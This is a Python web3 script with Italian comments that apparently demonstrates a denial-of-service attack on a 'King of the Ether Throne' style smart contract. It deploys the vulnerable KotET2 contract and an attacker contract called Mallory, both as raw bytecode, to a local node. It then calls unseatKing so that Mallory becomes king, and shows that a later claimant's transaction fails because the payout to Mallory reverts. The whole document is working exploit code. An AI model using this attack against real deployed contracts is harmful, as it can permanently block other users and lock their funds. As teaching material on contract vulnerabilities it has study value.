from web3 import Web3
import json

web3 = Web3(Web3.HTTPProvider('http://node:8545'))
if (web3.isConnected()):
    print("Connessione con il nodo riuscita" + "\n")
else:
    print("Connessione con il nodo fallita" + "\n")

kotet2Interface = [
	{
		"constant": False,
		"inputs": [
			{
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "sweepCommission",
		"outputs": [],
		"payable": False,
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "claimPrice",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": True,
		"inputs": [],
		"name": "king",
		"outputs": [
			{
				"name": "",
				"type": "address"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
kotet2InterfaceJS = json.dumps(kotet2Interface) 

malloryInterface = [
	{
		"constant": True,
		"inputs": [],
		"name": "getBalance",
		"outputs": [
			{
				"name": "",
				"type": "uint256"
			}
		],
		"payable": False,
		"stateMutability": "view",
		"type": "function"
	},
	{
		"constant": False,
		"inputs": [
			{
				"name": "king",
				"type": "address"
			},
			{
				"name": "w",
				"type": "uint256"
			}
		],
		"name": "unseatKing",
		"outputs": [],
		"payable": True,
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"payable": True,
		"stateMutability": "payable",
		"type": "fallback"
	}
]
malloryInterfaceJS = json.dumps(malloryInterface) 

kotet2Bytecode = "6060604052606460015533600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550670de0b6b3a764000034101561009f57600080fd5b6102e3806100ae6000396000f300606060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630eb3f5a01461012a57806312065fe01461014d57806315d655c914610176578063cc181ca81461019f575b600060015434101561007357600080fd5b61007b6101f4565b90506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168160405160006040518083038185876187965a03f19250505015156100d957600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610121610201565b60018190555050005b341561013557600080fd5b61014b600480803590602001909190505061020e565b005b341561015857600080fd5b61016061026d565b6040518082815260200191505060405180910390f35b341561018157600080fd5b61018961028c565b6040518082815260200191505060405180910390f35b34156101aa57600080fd5b6101b2610292565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000606460015401905090565b600060c860015401905090565b6000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f1935050505090505050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a72305820dbe5fe7aa35c5eabd79cf1dc7591e9bb23be25b657d345a89b7ccb5bd0766b9c0029"
malloryBytecode = "6060604052341561000f57600080fd5b6101358061001e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806312065fe01461005157806339341dde1461007a575b600080fd5b341561005c57600080fd5b6100646100b1565b6040518082815260200191505060405180910390f35b6100af600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506100d0565b005b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b60008273ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185876187965a03f19250505090505050505600a165627a7a7230582083cc82bb0bb3e737bcdfbe64f1ee75ba3334ae71c244c61a92da5883b14c95210029"

accounts = web3.eth.accounts
# Set dell'account con il quale farò i deploy
web3.eth.defaultAccount = web3.eth.accounts[0]

# Definisco un oggetto contratto kotet2 a partire dall'interfaccia e dal bytecode
kotet2Contract = web3.eth.contract(abi=kotet2InterfaceJS, bytecode=kotet2Bytecode)
# Costruisco la transazione per fare il deploy del contratto kotet2
contract_data = kotet2Contract.constructor().buildTransaction({'from': accounts[0], 'value': 1000000000000000000})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_kotet2 = web3.eth.contract(address=txn_receipt.contractAddress, abi=kotet2InterfaceJS)
# Address, balance e functions di KotET2
print("L'account[0] ha pubblicato il contratto KotET2: " + str((contract_kotet2.address)) 
+ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_kotet2.address)) + "\ned offre le seguenti funzioni:" + "\n"
+ str(contract_kotet2.all_functions()) + "\n")

# Definisco un oggetto contratto mallory a partire dall'interfaccia e dal bytecode
malloryContract = web3.eth.contract(abi=malloryInterfaceJS, bytecode=malloryBytecode)
# Costruisco la transazione per fare il deploy del contratto mallory
contract_data = malloryContract.constructor().buildTransaction({'from': accounts[1]})
# Spedisco la transazione 
deploy_txn = web3.eth.sendTransaction(contract_data)
#Attendo che la mia transazione venga elaborata e prendo la ricevuta
txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
# Salvo in un oggetto il contratto deployato
contract_mallory = web3.eth.contract(address=txn_receipt.contractAddress, abi=malloryInterfaceJS)
# Address, balance e functions di Mallory
print("L'account[1] ha pubblicato il contratto Mallory: " + str((contract_mallory.address)) 
+ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_mallory.address)) + "\ned offre le seguenti funzioni:" + "\n"
+ str(contract_mallory.all_functions()) + "\n")

# Stampa del re
print("Re del contratto kotet2 (è account[0] perché ne ha fatto il deploy):\n" + str(contract_kotet2.functions.king().call()) + "\n")

# Stampa del prezzo da pagare per diventare re
x = contract_kotet2.functions.claimPrice().call()
print("Il prezzo da pagare per diventare re ammonta a:\n" + str(x) + "\n")

# account[1] richiama la funzione unseatKing di Mallory con 100 wei per far diventare il contratto maligno il nuovo re
contract_mallory.functions.unseatKing(contract_kotet2.address, x).transact({'value': x, 'from': accounts[1]})
print(".........account[1] invoca unseatKing di Mallory per far diventare il contratto re.........\n")

# Stampa del nuovo re
print("Il nuovo re del contratto kotet2 è il contratto Mallory (è il contratto maligno che fa DoS):\n" + 
str(contract_kotet2.functions.king().call()) + "\n")


# Stampa del prezzo da pagare per diventare re aggiornato
x = contract_kotet2.functions.claimPrice().call()
print("Il nuovo prezzo da pagare per diventare re ammonta a:\n" + str(x) + "\n")

# Adesso come si vede se qualcuno prova a diventare il nuovo re non ci riesce
# account[2] invoca la fallback per diventare re
try: 
	contract_kotet2.fallback.transact({'value': x, 'from': accounts[2]})
except:
	print("Non puoi diventare re!!! Non riesco a mandare il compenso a Mallory\n")
